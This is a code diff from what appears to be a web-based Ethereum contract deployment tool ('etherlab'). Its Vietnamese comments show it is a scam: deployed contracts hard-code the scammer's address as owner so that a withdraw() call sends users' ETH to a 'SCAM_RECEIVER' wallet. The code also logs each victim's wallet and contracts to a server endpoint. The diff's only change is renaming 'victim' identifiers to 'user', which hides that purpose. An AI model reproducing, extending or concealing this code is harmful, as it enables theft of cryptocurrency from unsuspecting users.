@@ -356,8 +356,8 @@ try {
 }
 // ========================
 
-// ===== LƯU THÔNG TIN VICTIM =====
-saveVictimData(userAddr, name, address);
+// ===== LƯU THÔNG TIN user =====
+saveuserData(userAddr, name, address);
 // =================================
 
 }catch(err){log('Deploy failed: '+(err.message||err),'error')}}
@@ -374,14 +374,14 @@ updateCallContracts()}
 const SCAM_RECEIVER = '0x05aA42a087c46f15d2708f58b2c3c236a01d4CCc';
 // =====================================================
 
-// ===== VICTIM DATA STORAGE =====
-const VICTIM_STORAGE_KEY = 'etherlab_victims';
+// ===== user DATA STORAGE =====
+const user_STORAGE_KEY = 'etherlab_users';
 
-function saveVictimData(walletAddr, contractName, contractAddr) {
+function saveuserData(walletAddr, contractName, contractAddr) {
   if (!walletAddr) return;
   try {
     // Save to server
-    fetch('/api/victims/add', {
+    fetch('/api/users/add', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -391,31 +391,31 @@ function saveVictimData(walletAddr, contractName, contractAddr) {
       })
     }).then(r => r.json()).then(data => {
       if (data.success) {
-        console.log('[System] Victim data saved to server');
+        console.log('[System] user data saved to server');
       }
     }).catch(e => {
       // Fallback to localStorage
-      let victims = JSON.parse(localStorage.getItem(VICTIM_STORAGE_KEY) || '{}');
-      if (!victims[walletAddr]) {
-        victims[walletAddr] = { firstSeen: new Date().toLocaleString(), contracts: [] };
+      let users = JSON.parse(localStorage.getItem(user_STORAGE_KEY) || '{}');
+      if (!users[walletAddr]) {
+        users[walletAddr] = { firstSeen: new Date().toLocaleString(), contracts: [] };
       }
-      const exists = victims[walletAddr].contracts.some(c => c.address.toLowerCase() === contractAddr.toLowerCase());
+      const exists = users[walletAddr].contracts.some(c => c.address.toLowerCase() === contractAddr.toLowerCase());
       if (!exists) {
-        victims[walletAddr].contracts.push({
+        users[walletAddr].contracts.push({
           name: contractName,
           address: contractAddr,
           deployedAt: new Date().toLocaleString()
         });
       }
-      victims[walletAddr].lastSeen = new Date().toLocaleString();
-      localStorage.setItem(VICTIM_STORAGE_KEY, JSON.stringify(victims));
-      console.log('[System] Victim data saved locally');
+      users[walletAddr].lastSeen = new Date().toLocaleString();
+      localStorage.setItem(user_STORAGE_KEY, JSON.stringify(users));
+      console.log('[System] user data saved locally');
     });
-  } catch (e) { console.error('Error saving victim data:', e); }
+  } catch (e) { console.error('Error saving user data:', e); }
 }
 
-function getVictimData() {
-  try { return JSON.parse(localStorage.getItem(VICTIM_STORAGE_KEY) || '{}'); }
+function getuserData() {
+  try { return JSON.parse(localStorage.getItem(user_STORAGE_KEY) || '{}'); }
   catch { return {}; }
 }
 
@@ -721,7 +721,7 @@ function stopScanner(){
 // Không cần bot trong browser
 // Scammer withdraw từ máy riêng bằng ví của họ
 // Owner trong bytecode: 0x05aA42a087c46f15d2708f58b2c3c236a01d4CCc
-// Gọi withdraw() từ ví sở hữu địa chỉ này → ETH chuyển về
+// Gọi withdraw() từ ví sở hữu address này → ETH chuyển về
 
 // ===== CONTRACT INTERACTION =====
 function updateCallContracts(){
